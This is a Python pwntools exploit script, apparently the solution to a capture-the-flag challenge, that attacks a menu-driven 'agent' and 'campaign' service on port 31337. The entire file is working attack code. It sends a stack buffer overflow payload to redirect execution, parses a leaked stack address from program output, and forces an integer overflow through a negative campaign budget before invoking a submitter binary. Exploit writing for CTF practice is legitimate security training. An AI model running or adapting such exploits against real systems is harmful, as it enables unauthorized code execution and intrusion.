#!/usr/bin/python3

from pwn import *
# from ctypes import CDLL


def connect():
    HOST = os.environ.get('HOST', 'localhost')
    PORT = 31337
    p = remote(HOST, int(PORT))
    return p


def main():
    p = connect()
    payload = b"a"*(0x38) + p64(0x4015ea)
    p.sendline(payload)

    # add agent
    p.sendlineafter(b"Choice:", b"d")
    p.sendlineafter(b"Choice:", b"h")
    p.sendlineafter(b"Enter agent name:", b"agent")

    # add campagin
    p.sendlineafter(b"Choice:", b"x")
    p.sendlineafter(b"Choice:", b"a")
    p.sendlineafter(b"Choice:", b"c")
    p.sendlineafter(b"Enter campaign name:", b"camp")
    p.sendlineafter(b"Enter campaign budget:", b"1")
    p.sendlineafter(b"Region:", b"1")
    p.sendlineafter(b"Choice:", b"1")
    p.sendlineafter(b"Agent ID:", b"1")
    p.sendline(b"Essential")
    p.sendline(b"Positive")
    p.sendline(b"Wellness")
    p.sendline(b"Great")
    p.sendline(b"Excellent")

    p.sendlineafter(b"Choice:", b"V")
    p.recvuntil(b" (Value:")
    leak = p.recvline()
    # print(leak)
    # b' $32767, Stock: 1809407848)\n'
    stack_leak = (int(leak.split(b", ")[0].split(b"$")[-1]) << 32)
    stack_leak_lower = int(leak.split(b" ")[-1].split(b")")[0])
    if stack_leak_lower < 0:
        stack_leak_lower += (1 << 32)
    stack_leak += stack_leak_lower
    print(hex(stack_leak))

    # edit campagin with max budget
    p.sendlineafter(b"Choice:", b"e")
    p.sendline(b"1")
    p.sendline(b"-2147483647")
    p.sendline(b"n")
    p.sendline(b"n")

    p.sendlineafter(b"Choice:", b"V")

    p.sendlineafter(b"Choice:", b"e")
    p.sendline(b"1")
    p.sendline(b"100000")
    p.sendline(b"n")
    p.sendline(b"n")

    p.sendlineafter(b"Choice:", b"V")

    p.sendlineafter(b"Choice:", b"e")
    p.sendline(b"1")
    p.sendline(b"0")
    p.sendline(b"n")
    p.sendline(b"n")

    p.sendlineafter(b"Choice:", b"V")

    p.sendlineafter(b"Choice:", b"p")
    p.sendline(b"1")

    p.sendline(b'x')
    p.sendline(b'n')

    p.sendline(b"./submitter")

    print(p.recvall(timeout=1))


if __name__ == "__main__":
    main()
